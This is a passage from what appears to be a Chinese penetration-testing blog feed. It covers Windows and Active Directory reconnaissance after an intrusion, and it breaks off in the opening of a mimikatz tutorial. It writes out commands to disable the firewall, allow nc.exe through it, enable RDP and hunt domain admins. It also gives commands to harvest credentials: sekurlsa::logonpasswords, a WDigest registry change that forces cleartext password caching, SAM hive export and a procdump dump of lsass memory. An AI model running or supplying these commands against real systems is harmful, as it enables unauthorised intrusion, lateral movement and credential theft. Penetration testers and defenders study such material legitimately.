class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">tasklist<br><span class="hljs-comment">//或者</span><br>wmic process list brief<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164012309.png" alt="image-20240107164012309"></p><p>常见杀毒软件进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">360s</span>d<span class="hljs-selector-class">.exe</span><br><span class="hljs-number">360</span>tray<span class="hljs-selector-class">.exe</span><br>ZhuDongFangYu<span class="hljs-selector-class">.exe</span><br>KSafeTray<span class="hljs-selector-class">.exe</span><br>SafeDogUpdateCenter<span class="hljs-selector-class">.exe</span><br>McAfee McShield<span class="hljs-selector-class">.exe</span><br>egui<span class="hljs-selector-class">.exe</span> <span class="hljs-comment">//NOD32</span><br>AVP<span class="hljs-selector-class">.EXE</span>  <span class="hljs-comment">//卡巴斯基</span><br>avguard<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//小红伞</span><br>bdagent<span class="hljs-selector-class">.exe</span><span class="hljs-comment">//BitDefender</span><br></code></pre></td></tr></table></figure><p>5.查看启动程序信息</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">wmic startup <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span>,<span class="hljs-title">caption</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164020573.png" alt="image-20240107164020573"><br>6.查看计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164030189.png" alt="image-20240107164030189"><br>7.查看主机开机时间</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> statistics workstation<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164040099.png" alt="image-20240107164040099"><br>8.查询用户列表</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span><br><span class="hljs-title">//获取本地管理员组成员：</span><br><span class="hljs-title">net</span> localgroup adinistrators<br>//查看当前再线用户<br>query <span class="hljs-keyword">user</span> <span class="hljs-title">|| qwinsta</span><br></code></pre></td></tr></table></figure><p>9.列出或断开本地计算机与所连接的客户端之间的会话</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> session<br></code></pre></td></tr></table></figure><p>10.查询端口列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p>11.查询补丁列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p>12.查询本机共享列表</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">net share<br><span class="hljs-comment">//wmic:</span><br>wmic share <span class="hljs-built_in">get</span> <span class="hljs-built_in">name</span>,path,status<br></code></pre></td></tr></table></figure><p>13.查询路由表及所有可用接口的ARP缓存表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span><br>arp -a<br></code></pre></td></tr></table></figure><p>14.查询防火墙相关配置</p><p>1）关闭防火墙</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">//windows server <span class="hljs-number">2003</span>之前<br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br>//Windows server <span class="hljs-number">2003</span>之后<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofile <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure><p> 2）查看防火墙配置</p><h4 id><a href="#" class="headerlink" title></a></h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">netsh firewall <span class="hljs-keyword">show </span><span class="hljs-built_in">config</span><br></code></pre></td></tr></table></figure><h4 id="3-修改防火墙配置"><a href="#3-修改防火墙配置" class="headerlink" title="3) 修改防火墙配置"></a>3) 修改防火墙配置</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之前允许指定程序全部连接<br>netsh firewall <span class="hljs-keyword">add</span> allowedprogram c:\nc.exe &quot;allow nc&quot; <span class="hljs-keyword">enable</span><br>//windows <span class="hljs-keyword">server</span> <span class="hljs-number">2003</span>之后的版本<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;pass nc&quot; dir=<span class="hljs-keyword">in</span> action=allow program=&quot;c:\nc.exe&quot;<br>//允许指定程序退出<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Allow nc&quot; dir=<span class="hljs-keyword">out</span> action=allow program=&quot;C:\nc.exe&quot;<br>//允许<span class="hljs-number">3389</span>端口放行<br>netsh advfirewall firewall <span class="hljs-keyword">add</span> <span class="hljs-keyword">rule</span> <span class="hljs-type">name</span>=&quot;Remote Desktop&quot; protocol=TCP dir=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow<br></code></pre></td></tr></table></figure><h4 id="4-自定义防火墙日志的存储位置"><a href="#4-自定义防火墙日志的存储位置" class="headerlink" title="4)自定义防火墙日志的存储位置"></a>4)自定义防火墙日志的存储位置</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall <span class="hljs-built_in">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;C:\windows\temp\fw.log&quot;</span><br></code></pre></td></tr></table></figure><h3 id="15-查看代理配置情况"><a href="#15-查看代理配置情况" class="headerlink" title="15.查看代理配置情况"></a>15.查看代理配置情况</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></code></pre></td></tr></table></figure><h3 id="16-查询并开启远程连接服务"><a href="#16-查询并开启远程连接服务" class="headerlink" title="16.查询并开启远程连接服务"></a>16.查询并开启远程连接服务</h3><h4 id="1）查看远程连接端口"><a href="#1）查看远程连接端口" class="headerlink" title="1）查看远程连接端口"></a>1）查看远程连接端口</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br></code></pre></td></tr></table></figure><h4 id="2-在Windows-server-2003中开启3389"><a href="#2-在Windows-server-2003中开启3389" class="headerlink" title="2)在Windows server 2003中开启3389"></a>2)在Windows server 2003中开启3389</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS !=&quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="3-在Windows-server-2008和2012中"><a href="#3-在Windows-server-2008和2012中" class="headerlink" title="3)在Windows server 2008和2012中"></a>3)在Windows server 2008和2012中</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmic /<span class="hljs-keyword">namespace</span>:\\<span class="hljs-symbol">root</span>\<span class="hljs-symbol">cimv2</span>\<span class="hljs-symbol">terminalservices</span> <span class="hljs-symbol">path</span> <span class="hljs-symbol">win32_terminalservicesetting</span> <span class="hljs-symbol">where</span> (<span class="hljs-symbol">__CLASS</span> !=&quot;&quot;) <span class="hljs-symbol">call</span> <span class="hljs-symbol">setallowtsconnections</span> <span class="hljs-symbol">1</span><br>//修改注册表方式<br><span class="hljs-symbol">reg</span> <span class="hljs-symbol">query</span> &quot;<span class="hljs-symbol">HKLM</span>\<span class="hljs-symbol">System</span>\<span class="hljs-symbol">CURRENT</span>\<span class="hljs-symbol">CONTROLSET</span>\<span class="hljs-symbol">CONTROL</span>\<span class="hljs-symbol">TERMINAL</span> <span class="hljs-symbol">SERVER</span>&quot; /<span class="hljs-symbol">v</span> <span class="hljs-symbol">fSingleSessionPerUser</span> /<span class="hljs-symbol">t</span> <span class="hljs-symbol">REG_DWORD</span> /<span class="hljs-symbol">d</span> <span class="hljs-symbol">0</span> /<span class="hljs-symbol">f</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2-自动收集信息"><a href="#2-2-2-自动收集信息" class="headerlink" title="2.2.2 自动收集信息"></a>2.2.2 自动收集信息</h3><p>这里原文将上述的语句进行自动化，并将结果输出到了一个HTML文件中。</p><h3 id="2-2-3-Empire下的主机信息收集"><a href="#2-2-3-Empire下的主机信息收集" class="headerlink" title="2.2.3 Empire下的主机信息收集"></a>2.2.3 Empire下的主机信息收集</h3><p>使用模块：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/host/</span>winenum<br>execute<br></code></pre></td></tr></table></figure><h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p>查询指定用户的详细信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> /domain<br></code></pre></td></tr></table></figure><h2 id="2-4-判断是否存在域"><a href="#2-4-判断是否存在域" class="headerlink" title="2.4 判断是否存在域"></a>2.4 判断是否存在域</h2><p>查看dns服务器</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gml">ipconfig /<span class="hljs-literal">all</span><br><span class="hljs-comment">//将查看到的DNS服务器用nslookup进行解析</span><br>nslookup dc.test.<span class="hljs-symbol">local</span><br></code></pre></td></tr></table></figure><p>查看系统详细信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">systeminfo | findstr <span class="hljs-regexp">/B /</span>C:<span class="hljs-string">&quot;登录服务器&quot;</span><br><span class="hljs-regexp">//</span>如果结果不为<span class="hljs-string">&quot;WORKGROUP&quot;</span>则主机为域主机<br></code></pre></td></tr></table></figure><p>查询当前登录域及登录用户信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">workstation</span><br></code></pre></td></tr></table></figure><p>判断主域</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net time /<span class="hljs-built_in">domain</span><br><span class="hljs-comment">//命令用于查看域内时间，同时也可以查看域控制器</span><br></code></pre></td></tr></table></figure><h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5 探测域内存活主机"></a>2.5 探测域内存活主机</h2><p>使用nbtscan(<a href="http://www.unixwiz.net/tools/nbtscan.html)%E6%8E%A2%E6%B5%8B%E5%BD%93%E5%89%8D%E7%BD%91%E6%AE%B5%E4%B8%BB%E6%9C%BA">http://www.unixwiz.net/tools/nbtscan.html)探测当前网段主机</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nbt</span>.exe <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>使用ICMP探测</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /L %I in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) DO @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span><br></code></pre></td></tr></table></figure><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-s5HEC2y4-1611211198738)(2.内网信息收集.assets&#x2F;1580203080227.png)]</p><p>通过ARPscan工具扫描探测内网</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>.exe -t <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>Empire中的ARPscan模块</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemode situational_awareness<span class="hljs-regexp">/network/</span>arpscan<br>execute<br></code></pre></td></tr></table></figure><p>Nishang中的Invoke-ARPScan.ps1</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell.exe -exec bypass -Command &quot;&amp; (Import-module c:\windows\temp\Invoke-ARPscan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20)&quot; &gt;&gt; c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br><span class="hljs-keyword">type</span> c:\windows\<span class="hljs-keyword">temp</span>\<span class="hljs-keyword">log</span>.txt<br></code></pre></td></tr></table></figure><p>通过常规的TCP&#x2F;UDP端口扫描探测内网</p><p>上传ScanLine进行扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scanline</span> -h -t <span class="hljs-number">22</span>,<span class="hljs-number">80</span>-<span class="hljs-number">90</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span> -u <span class="hljs-number">53</span>,<span class="hljs-number">161</span> -O c:\windows\temp\log.txt -p <span class="hljs-number">192.168.1.1</span>-<span class="hljs-number">254</span> /b<br></code></pre></td></tr></table></figure><h2 id="2-6扫描域内端口"><a href="#2-6扫描域内端口" class="headerlink" title="2.6扫描域内端口"></a>2.6扫描域内端口</h2><p>telnet(但是这个速度太慢了点)</p><p>S扫描器</p><p>Metasploit端口扫描</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">auxiliary/scanner/portscan/tcp<br><span class="hljs-keyword">set</span> ports <span class="hljs-comment">1-1000</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">RHOST 192.168.1.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">THREADS 10</span><br>run<br></code></pre></td></tr></table></figure><p>PowerSploit、NiShang的Invoke-portscan脚本</p><h2 id="2-7-收集域内基础信息"><a href="#2-7-收集域内基础信息" class="headerlink" title="2.7 收集域内基础信息"></a>2.7 收集域内基础信息</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain<br><span class="hljs-comment">//查询域</span><br><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain:<span class="hljs-keyword">test</span><br><span class="hljs-comment">//查询域内所有计算机</span><br><br><span class="hljs-keyword">net</span> group /domain<br><span class="hljs-comment">//查询域内所有用户组列表</span><br><br><span class="hljs-keyword">net</span> group <span class="hljs-string">&quot;domain computers&quot;</span> /domain<br><span class="hljs-comment">//查询所有域成员计算机列表</span><br><br><span class="hljs-keyword">net</span> accounts /domain<br><span class="hljs-comment">//获取域内密码信息</span><br><br>nltest /domain_trusts<br><span class="hljs-comment">//域内信任信息</span><br></code></pre></td></tr></table></figure><h2 id="2-8-查找域控"><a href="#2-8-查找域控" class="headerlink" title="2.8 查找域控"></a>2.8 查找域控</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>可以看，域控制器的机器名<br>nltest /DCLIST:test<br><span class="hljs-regexp">//</span>查询当前时间<br>net time /domain<br><span class="hljs-regexp">//</span>查询域控制器的主机名<br>Nslookup -type=SRV _ldap._tcp<br><span class="hljs-regexp">//</span>查询域控制器组<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><span class="hljs-regexp">//</span>查看主控制器，可以看见域控制器的机器名<br>netdom query pdc<br></code></pre></td></tr></table></figure><h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询所有域用户列表<br>net user /domain<br><br><span class="hljs-regexp">//</span>获取域内用户的详细信息<br>wmic useraccount get /all<br><br><span class="hljs-regexp">//</span>查看存在的用户,但是这个只能在域控或者安装了对应服务的主机使用，否则会提示命令不存在<br>dsquery user<br><br><span class="hljs-regexp">//</span>查找目录中的计算机<br>dsquery computer<br><br><span class="hljs-regexp">//</span>查询本地管理员组用户<br>net localgroup administrators<br><br><span class="hljs-regexp">//</span>查询域管理员用户组<br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>查询管理员用户组<br>net group <span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p>2.10 定位域管理员</p><p>在获取了Windows域中的普通权限在进行横向渗透时，需要知道域内用户登录的位置，是否是任何系统&#x2F;主机的本地管理员，以及所属组等信息。能够使用的工具有：psloggedon.exe、PVEFindADUser.exe、netness.exe、hunter、NetView、PowerView。</p><p>psloggedon.exe等</p><p>能够通过此工具查看远程计算机的资源，也就是说能够查看目标主机有哪些账户在登录状态</p><p>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon</a></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">psloggedon.exe <span class="hljs-string">\\dc2012</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164100241.png" alt="image-20240107164100241"></p><p>PVEFindADUser</p><p>PVEFindADUser能够用于查找活动目录用户登录的位置，枚举与用户，以及查找在特定计算机上登录的用户。包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。（这个工具需要.NET 3.5）</p><p>Windows Server 2012安装.NET 3.5可能不成功，需要指定安装源：</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164130507.png" alt="image-20240107164130507"></p><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">PVEFindADUser.exe -<span class="hljs-literal">current</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164138112.png" alt="image-20240107164138112"></p><p>NetView</p><p>NetView是一个枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时还能够查询共享入口和有价值的用户。</p><p>下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><p>Netness</p><p>PowerView</p><p>使用Powerview的Invoke-UserHunter。</p><p> Empire</p><p>Empire中也存在此类型的脚本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule situational_awareness<span class="hljs-regexp">/network/</span>powerview/user_hunter<br>execute<br></code></pre></td></tr></table></figure><p>Nmap的NSE脚本</p><p>通过Nmap的NSE脚本获取远程机器的登陆会话。</p><p>smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html</a></p><p>smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</p><p>smb-enum-users.nse可以使用此脚本对域控进行扫描。</p><p> 2.11 查找域管理进程</p><p>其中阿里云上有个链接也说到了类似的方法：<a href="https://yq.aliyun.com/articles/599377?type=2">https://yq.aliyun.com/articles/599377?type=2</a></p><p>本机检查：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>获取域管理员列表<br>net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>列出本机的所有进程和进程用户<br>tasklist /v<br></code></pre></td></tr></table></figure><p>查询域控的域用户会话</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>查询域控列表<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br><br><span class="hljs-regexp">//</span>收集所有活动域的会话列表<br>netsess -h<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mimikatz使用</title>
    <link href="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><p><strong>- 获取本地账号密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br><br><span class="hljs-comment">#抓取密码</span><br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213207690.png" alt="image-20240107213207690"><br>当目标为win10或者2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。<br>cmd修改注册表命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p><strong>-  SAM表获取hash</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导出SAM数据</span><br>reg save HKLM\SYSTEM SYSTEM<br>reg save HKLM\SAM SAM<br><br><span class="hljs-comment">#使用mimikatz提取hash</span><br>lsadump::sam /sam:SAM /system:SYSTEM<br></code></pre></td></tr></table></figure><p><strong>- Procdump+Mimikatz</strong><br>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213218444.png" alt="image-20240107213218444"></p><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 